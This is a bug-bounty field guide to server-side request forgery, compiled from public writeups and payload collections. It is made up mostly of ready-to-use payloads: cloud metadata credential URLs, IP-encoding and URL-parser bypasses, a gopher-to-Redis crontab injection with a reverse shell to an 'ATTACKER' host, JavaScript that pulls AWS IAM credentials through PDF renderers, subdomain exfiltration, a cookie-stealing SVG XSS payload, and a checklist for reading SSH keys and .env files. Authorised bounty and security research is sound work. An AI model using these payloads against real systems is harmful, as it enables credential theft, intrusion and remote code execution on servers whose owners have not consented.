# SSRF Complete Field Guide — Bug Bounty Edition

> Compiled from: Intigriti, YesWeHack, jhaddix gist, PayloadsAllTheThings, DarkT writeup, nocley writeup, PortSwigger research

---

## 1. What is SSRF

Server-Side Request Forgery — attacker controls a URL the **server** fetches on their behalf. The server lives inside the trusted network boundary, giving you access to internal APIs, admin panels, cloud metadata, and backend services invisible from the internet.

Root cause: application treats server-initiated requests as safe regardless of attacker-controlled destination.

---

## 2. SSRF Types

### Classic (In-Band)
Response reflected back to you. Easiest to confirm and exploit. Example: profile image loader returns the fetched content.

### Blind (Out-of-Band)
Server makes request, you never see the response. Confirmed only via DNS/HTTP callbacks (Burp Collaborator, interactsh). Far more common in production.

### Second-Order
Input saved, later passed to an internal API component that makes the fetch. Harder to spot — submit payload, trigger a different action to trigger the fetch.

---

## 3. Where to Find SSRF — Entry Points

### Obvious (often hardened)
- URL params: `url=`, `callback=`, `redirect_uri=`, `image_url=`, `src=`, `dest=`, `path=`, `target=`, `feed=`, `reference=`
- Profile image loaders accepting remote URLs
- Webhook configuration fields
- OAuth/SSO: SAML metadata URL, OIDC discovery URL
- Import from URL / RSS feed readers
- PDF generators with user-controlled content

### Hidden (where bounties live)
- HTTP headers: `X-Forwarded-For`, `X-Forwarded-Host`, `X-Original-URL`, `Referer`, `Host`, `True-Client-IP`
- Uploaded files: XML with external entities (XXE→SSRF), SVG `<image href>`, DOCX/XLSX with external references, HTML templates
- PDF/screenshot generators — parse HTML that you inject
- Social sharing preview features (fetch OG metadata)
- Async jobs: report generators, email rendering, content moderation pipelines, search indexers
  - Note: callbacks may arrive hours later from a different IP — keep your listener running
- JavaScript files — search for: `/api/fetch`, `/api/proxy`, `/api/preview`, `/api/unfurl`, `fetchRemote`, `proxyRequest`, `getPreview`

### Burp Tools for Discovery
- **Param Miner**: guesses undocumented URL-handling params/headers that cause response differences
- **Collaborator Everywhere**: auto-injects Collaborator payloads into all headers as you browse — surfaces blind SSRF passively

---

## 4. Basic Exploitation

```
POST /api/profile-img HTTP/2
{"imgURL": "http://localhost/"}
```

If content type validation is missing and redirects are followed — you have basic SSRF.

---

## 5. Internal Network Access

After confirming SSRF, first target: localhost. Local management interfaces are never hardened because they're not supposed to be reachable.

```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
```

Port sweep for running services:
```
http://127.0.0.1:22     → SSH
http://127.0.0.1:3306   → MySQL
http://127.0.0.1:5432   → PostgreSQL
http://127.0.0.1:6379   → Redis
http://127.0.0.1:8080   → Internal admin
http://127.0.0.1:9200   → Elasticsearch
http://127.0.0.1:11211  → Memcached
```

RFC 1918 internal network scan:
```
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
```

**Bonus escalation — Apache /server-status:**
```
http://127.0.0.1/server-status
```
Leaks in-flight requests from other users: session tokens, API keys, query params.

---

## 6. Cloud Metadata Endpoints

### AWS EC2 (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```
Returns: AccessKeyId, SecretAccessKey, Token — usable immediately with AWS CLI.

**AWS ECS alternative (when standard metadata blocked):**
```
http://169.254.170.2/v2/credentials/[UID]
```

**AWS IMDSv2 (requires PUT + token — use headless browser SSRF):**
```javascript
const token = await fetch('http://169.254.169.254/latest/api/token', {
    method: 'PUT',
    headers: {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
}).then(r => r.text());

const creds = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/role', {
    headers: {'X-aws-ec2-metadata-token': token}
}).then(r => r.text());
```

### Google Cloud Platform
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```
Requires header: `Metadata-Flavor: Google`
Note: GCP rejects requests containing `X-Forwarded-For`. If SSRF adds this header automatically, it may block you.

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
Requires header: `Metadata: true`

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

### Oracle Cloud
```
http://192.0.0.192/latest/
http://192.0.0.192/latest/meta-data/
```

### Alibaba
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
```

---

## 7. Filter Bypass Techniques

### IP Address Obfuscation (bypass blocklists)
When `127.0.0.1` or `localhost` is blocked:
```
http://2130706433/          ← decimal
http://0177.0.0.1/          ← octal
http://0x7f.0x0.0x0.0x1/   ← hex
http://127.1/               ← shorthand
http://[::1]/               ← IPv6 loopback
http://[::ffff:127.0.0.1]/  ← IPv4-mapped IPv6
http://0xa9fea9fe/          ← hex for 169.254.169.254

# AWS metadata alternate notations
http://2852039166/latest/user-data   ← decimal
http://169.254.43518/latest/user-data
http://169.16689662/latest/user-data
fd00:ec2::254               ← IPv6 for AWS metadata
```
Tool: [ipfuscator](https://github.com/vysecurity/IPFuscator)

### Domain Redirection (bypass string-match filters)
Domains that resolve to 127.0.0.1:
```
localhost.me
127.0.0.1.nip.io
example.com.127.0.0.1.nip.io
```

### URL Parser Confusion (bypass allowlists — Orange Tsai technique)
```
http://expected.com@127.0.0.1/
http://expected.com:80@127.0.0.1/
http://expected.com#@127.0.0.1/
https://assets.example.com.attacker.com/
```
Validator sees trusted domain, HTTP client connects to 127.0.0.1.

### Allowlist Bypass Patterns
```
.{CANARY_TOKEN}
@{CANARY_TOKEN}
example.com.{CANARY_TOKEN}
example.com@{CANARY_TOKEN}
{CANARY_TOKEN}#example.com
{CANARY_TOKEN}?example.com
{CANARY_TOKEN}#@example.com
```

### Protocol Bypass (when only path is accepted)
```
//{CANARY_TOKEN}
\\{CANARY_TOKEN}
////{CANARY_TOKEN}
http:{CANARY_TOKEN}
/%00/{CANARY_TOKEN}
/%0A/{CANARY_TOKEN}
/%09/{CANARY_TOKEN}
```

### Open Redirect Chaining
If target allowlists its own domain, find an open redirect on that domain:
```
https://app.example.com/redirect?url=http://169.254.169.254/
```
Service `r3dir.me` provides redirect endpoints for testing.

### Redirect Server (when you have VPS)
```php
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
```
Use 307 (not 301) to preserve POST method when needed.

### DNS Rebinding
Defeats validation that resolves hostname then makes separate request. Use TTL=0 domains.
- [Singularity of Origin](http://rebind.it/singularity.html)
- [1u.ms](http://1u.ms/) — `http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms/`

Alternates between external IP (passes validation) and 127.0.0.1 (actual fetch destination).

### Real-World Tricky SSRF (DarkT writeup)
Endpoint concatenated user input to base URL: `http://cdn.external-host.com{path}`
- Input `.myid.ostify.com` resolved as `cdn.external-host.com.myid.ostify.com` → DNS hit, no HTTP (SSL error)
- Fix: register `cdn.external-host.com.yourdomain.com` with valid Let's Encrypt cert
- Then: SSRF confirmed for external content
- Escalate: host redirect server → `302` to `http://127.0.0.1` → HTTPS→HTTP downgrade bypassed
- Result: full internal access → critical

---

## 8. Alternative URL Schemes

Test which schemes the HTTP client supports — each unlocks different attack surfaces:

| Scheme | Target | Notes |
|--------|--------|-------|
| `file:///etc/passwd` | Local files | Fastest path to secrets |
| `file:///proc/self/environ` | Env vars | May contain secrets |
| `file:///app/.env` | App config | |
| `gopher://` | Raw TCP | RCE via Redis/FastCGI/SMTP |
| `dict://127.0.0.1:6379/info` | Redis info | Fallback when gopher blocked |
| `dict://127.0.0.1:11211/stats` | Memcached | |
| `ldap://127.0.0.1:389/` | LDAP | Directory exposure |
| `sftp://` / `tftp://` | OOB callback | For egress-restricted targets |

---

## 9. Gopher Protocol — SSRF to RCE

Gopher sends arbitrary raw bytes to any TCP port. Unlocks: Redis, MySQL, FastCGI, SMTP, Memcached.

Tool: [Gopherus](https://github.com/Esonhugh/Gopherus3)

### Redis RCE via Gopher
```bash
gopherus --exploit redis
```
Crontab injection for reverse shell:
```
gopher://127.0.0.1:6379/_FLUSHALL
SET 1 "* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SAVE
```

### FastCGI RCE (PHP-FPM port 9000)
```bash
gopherus --exploit fastcgi
```
Executes any PHP file present on the filesystem.

### SMTP Spoofing via Gopher
Reach port 25 → send spoofed email from server's own mail system.

---

## 10. PDF Generator / Headless Browser SSRF

### Why PDF SSRF is Special
- JavaScript execution in real Chromium
- Multi-request: every `<img>`, `<iframe>`, `<script>`, `<link>` triggers fetches
- Full HTTP control: custom methods, headers, request bodies
- `file://` local file read on many configs
- Direct RCE on misconfigured renderers (wkhtmltopdf, PhantomJS, --no-sandbox Chromium)

### Common Stacks to Fingerprint
- Puppeteer / Playwright → HeadlessChrome User-Agent
- wkhtmltopdf → limited JS, WebKit-based
- WeasyPrint → no JS, fetches CSS/images
- PrinceXML → commercial, limited JS

### JavaScript Payload (classic)
```html
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
    .then(r => r.text())
    .then(role => fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role))
    .then(r => r.text())
    .then(creds => { document.body.innerText = creds; });
</script>
```
Note: add async/await + force page to wait before PDF capture (renderers have 2-5s timeout).

### Without JavaScript
```html
<!-- Blind confirmation -->
<img src="http://collaborator.oastify.com/probe">

<!-- Render internal page into PDF -->
<iframe src="http://127.0.0.1:8080/admin" width="100%" height="2000"></iframe>

<!-- CSS-based fetch -->
<style>body { background: url('http://collaborator.oastify.com/css'); }</style>

<!-- Local file read -->
<link rel="stylesheet" href="file:///etc/passwd">
<embed src="file:///C:/WINDOWS/WIN.INI" width="600" height="400"/>

<!-- SVG exfil -->
<svg><image href="http://169.254.169.254/latest/meta-data/hostname"/></svg>
```

### SSRF via HTML Injection in PDF
```html
<iframe src="http://localhost/"></iframe>
```
Or using XMLHttpRequest:
```javascript
var x = new XMLHttpRequest();
x.onload = function(){ document.write(this.responseText) };
x.open('GET', 'http://127.0.0.1');
x.send();
```

---

## 11. Blind SSRF — Proving Impact

DNS callback only = usually informational. To escalate:

### Exfiltration via Subdomain
```
http://[DATA].your-collaborator.net/
```
Embed response data in the subdomain you control.

### Timing-Based Port Map
- Open ports: fast response
- Filtered ports: timeout
- Non-existent hosts: different timeout pattern

### Blind SSRF Chains (assetnote)
[assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains) — escalation chains for internal services (Redis, Elasticsearch, Jenkins, etc.)

### Shellshock via Blind SSRF
If underlying library supports `User-Agent` injection and internal service is vulnerable to Shellshock (bash <4.3), chain SSRF → RCE. (PortSwigger Academy has a lab for this.)

---

## 12. SVG → Stored XSS Chain

When SSRF response is reflected to other users:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY js "alert(document.cookie)">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <circle cx="50" cy="50" r="40"/>
  <script type="text/javascript">eval('&js;');</script>
</svg>
```
Host on your server → SSRF fetches it → stored XSS on target origin.

---

## 13. Real Writeup Highlights

### DarkT — Tricky SSRF Chain
- CMS image endpoint: `/api/cms/images/{size}?path=/path/to/image`
- `.myid.ostify.com` → DNS hit only (SSL error on Collaborator wildcard cert)
- Registered `cdn.external-host.com.0xdarkt.com` + valid cert → full HTTP response
- Stored XSS → account takeover (no old password required)
- Redirect server `302` → downgraded HTTPS to HTTP → internal access
- Reached `169.254.169.254` → Critical severity → $$$$ bounty

### nocley — Exceptional SSRF (Intigriti)
- Found `DocumentUrl` parameter containing base64-encoded internal IP URL
- Collaborator pingback confirmed SSRF
- HTTP exploitation failed (PDF content-type enforcement)
- `file:///` scheme worked — directory listing of server
- Wrote script to brute-force + clone server directory
- Found config files with credentials → Exceptional rating

---

## 14. Tools Reference

| Tool | Use |
|------|-----|
| Burp Collaborator | OOB callbacks for blind SSRF |
| interactsh | Open-source Collaborator alternative |
| Collaborator Everywhere (Burp ext) | Passive blind SSRF discovery |
| Param Miner (Burp ext) | Undocumented param/header discovery |
| Gopherus | Gopher payload generation |
| ipfuscator | IP encoding variants |
| 1u.ms / rebind.it | DNS rebinding |
| r3dir.me | Open redirect for bypass |
| LinkFinder / JSpector | JS endpoint discovery |

---

## 15. Bug Bounty Checklist

### Phase 1: Recon & Discovery
- [ ] Browse app with proxy on — flag any request containing URL/path parameters
- [ ] Run Collaborator Everywhere during full app walkthrough
- [ ] Run Param Miner on interesting endpoints
- [ ] Mine JS files for hidden API routes with URL-handling names
- [ ] Note all features: profile image, webhooks, PDF export, link preview, import, SSO config
- [ ] Check HTTP headers: `Referer`, `X-Forwarded-For`, `X-Forwarded-Host`, `X-Original-URL`
- [ ] Test file upload for XML (XXE→SSRF), SVG, DOCX with external refs

### Phase 2: Confirm SSRF
- [ ] Submit Collaborator URL to all suspected params
- [ ] Test variations: `http://`, `//`, `@`, `.`, base64-encoded URL
- [ ] Wait for async jobs (Collaborator listener for hours)
- [ ] Check both DNS and HTTP callbacks — HTTP = full request confirmed

### Phase 3: Filter Bypass
- [ ] IP encoding variants (decimal, octal, hex, shorthand)
- [ ] IPv6 forms: `[::1]`, `[::ffff:127.0.0.1]`
- [ ] URL parser confusion: `http://allowed.com@127.0.0.1/`
- [ ] DNS resolving to 127.0.0.1: `localhost.me`, `127.0.0.1.nip.io`
- [ ] Open redirect chaining on allowlisted domain
- [ ] Redirect server (302 → internal IP)
- [ ] DNS rebinding (1u.ms)
- [ ] Protocol variants: `//`, `\\`, `/%00/`, `/%0A/`

### Phase 4: Escalation
- [ ] Probe localhost ports (22, 3306, 5432, 6379, 8080, 9200)
- [ ] Hit cloud metadata: `169.254.169.254`
- [ ] Extract IAM role name then credentials (AWS)
- [ ] Test `file://` scheme
- [ ] Test `gopher://` for raw TCP (Redis, FastCGI)
- [ ] Test `dict://` as Gopher fallback
- [ ] Fetch `/server-status` on Apache (session token leak)
- [ ] Scan internal RFC1918 ranges for other hosts
- [ ] Read: `/etc/passwd`, `/proc/self/environ`, `~/.ssh/id_rsa`, `.env`, config files

### Phase 5: PDF/Headless Browser
- [ ] Inject `<iframe src="http://127.0.0.1:8080/">` in user-controlled content
- [ ] Test `<img src="http://collaborator">` for blind confirm
- [ ] Try JS fetch chain for AWS creds if Chromium detected
- [ ] Test `file://` via `<link>`, `<embed>`, `<object>` tags
- [ ] IMDSv2: PUT token via JS fetch → header injection

### Phase 6: Blind Escalation
- [ ] Exfil via subdomain: `http://DATA.collaborator.net`
- [ ] Timing-based port mapping
- [ ] Assetnote blind-ssrf-chains for internal service exploitation
- [ ] Check for Shellshock if old bash suspected

### Phase 7: Chaining
- [ ] SSRF → XSS via reflected SSRF response (SVG payload)
- [ ] SSRF → open redirect → allowlist bypass
- [ ] Blind SSRF → internal port scan → Redis/FastCGI → RCE via Gopher
- [ ] SSRF → credential leak → privilege escalation
- [ ] Second-order: submit payload, trigger separate action, observe callback

---

## 16. Impact Tiers for Reporting

| Impact | Severity | Evidence Needed |
|--------|----------|-----------------|
| DNS callback only | Low/Info | Not enough on most programs |
| HTTP callback (blind) | Low-Medium | Show OOB interaction, note potential |
| Internal port scan | Medium | Show open services discovered |
| Cloud metadata read | Critical | Show IAM credentials returned |
| `/etc/passwd` read | High | Show file content |
| Credential exfil | Critical | Config/env files with secrets |
| Redis/FastCGI RCE | Critical | Command execution proof |
| Account takeover chain | Critical | Show account compromise |

---

## 17. Key Resources

- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [jhaddix Cloud Metadata gist](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b)
- [allthingsssrf](https://github.com/jdonsec/allthingsssrf)
- [assetnote blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)
- [Gopherus](https://github.com/Esonhugh/Gopherus3)
- [Orange Tsai — A New Era of SSRF (URL Parser research)](https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [PortSwigger — Cracking the Lens](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
- [PortSwigger Web Security Academy SSRF labs](https://portswigger.net/web-security/ssrf)

- https://oreobiscuit.gitbook.io/introduction/bug-bounty-reports-and-articles/request-forgery-csrf-and-ssrf/ssrf

- https://www.youtube.com/watch?v=Ga9o--v-grA

- https://www.youtube.com/@BugBountyReportsExplained/search?query=ssrf

- https://www.youtube.com/watch?v=ashSoc59z1Y

- https://www.youtube.com/watch?v=R5WB8h7hkrU

- https://www.youtube.com/watch?v=Uklsk1WZ2EU

- https://www.youtube.com/watch?v=YQ5ixykKnyY

- https://www.youtube.com/watch?v=q0YgfwOndOw

- https://www.youtube.com/watch?v=sMk5ajkJO5o

- https://www.youtube.com/watch?v=NZ0UUDCHoWg

- https://www.youtube.com/watch?v=iBOhI-X6lCI

- https://www.youtube.com/watch?v=JiMzpjgAXv8

- https://www.youtube.com/watch?v=hozjuAej1mo

- https://www.youtube.com/watch?v=MBQJJ3jfJ8k

- https://www.youtube.com/watch?v=FwahyqRna5k

- https://www.youtube.com/watch?v=90AdmqqPo1Y

- https://www.youtube.com/watch?v=lM5wk_zWqVc

- https://www.youtube.com/watch?v=heyWQ2tqpqA

- https://www.youtube.com/watch?v=0GxsUS1P5xs

- https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-a-complete-guide-to-exploiting-advanced-ssrf-vulnerabilities

- https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

- https://github.com/jdonsec/allthingsssrf

- https://www.yeswehack.com/learn-bug-bounty/server-side-request-forgery-ssrf?utm_source=twitter&utm_medium=social&utm_campaign=server-side-request

- https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

- https://x.com/hacker_/status/1694554700555981176

- https://darkt.medium.com/how-i-found-tricky-server-side-request-forgery-ssrf-96c5fb630acd

- https://x.com/techycodec08/status/1894435176199196913

- https://x.com/Rhynorater/status/1689400476452679682

- https://medium.com/@nocley/my-exceptional-ssrf-finding-73e8039e3a22

- https://x.com/thedawgyg/status/2006390944103383325

- https://www.youtube.com/watch?v=zP4b3pw94s0
